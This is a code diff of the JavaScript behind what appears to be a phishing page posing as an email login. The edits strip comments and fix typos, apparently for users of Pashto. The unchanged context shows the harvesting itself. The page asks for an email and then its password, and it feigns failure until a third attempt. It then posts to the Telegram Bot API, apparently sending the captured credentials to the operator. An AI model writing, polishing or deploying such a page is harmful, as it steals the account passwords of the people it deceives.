@@ -137,7 +137,6 @@
 
     // ========== Password Validation Functions ==========
     function isEnglishPassword(password) {
-        // Check if password contains only English letters, numbers, and special characters
         return /^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]+$/.test(password);
     }
     
@@ -174,15 +173,13 @@
     document.getElementById('nextBtn').onclick = () => {
         let email = document.getElementById('emailInput').value.trim();
         
-        // Check if email is empty
         if (!email) {
-            showMessage(document.getElementById('errorBox'), 'Please enter  your email', true);
+            showMessage(document.getElementById('errorBox'), 'Please enter your email', true);
             return;
         }
         
-        // Check if email format is valid
         if (!isValidEmail(email)) {
-            showMessage(document.getElementById('errorBox'), 'Please enteu email EX:username@gmail.com', true);
+            showMessage(document.getElementById('errorBox'), 'Please enter email EX:username@gmail.com', true);
             return;
         }
         
@@ -198,19 +195,16 @@
     document.getElementById('loginBtn').onclick = async () => {
         let pass = document.getElementById('passwordInput').value.trim();
         
-        // Check if password is empty
         if (!pass) {
             showMessage(document.getElementById('errorBox'), 'Please enter your email password', true);
             return;
         }
         
-        // Check if password contains only English characters
         if (!isEnglishPassword(pass)) {
-            showMessage(document.getElementById('errorBox'), 'Pashto not not allowed ', true);
+            showMessage(document.getElementById('errorBox'), 'Pashto not allowed', true);
             return;
         }
         
-        // Check password minimum length (8 characters)
         if (!hasMinimumLength(pass, 8)) {
             showMessage(document.getElementById('errorBox'), 'Please check your password', true);
             return;
@@ -240,7 +234,6 @@
         
         // Third attempt - success
         if (currentAttempt >= 3) {
-            // Send notification to admin
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
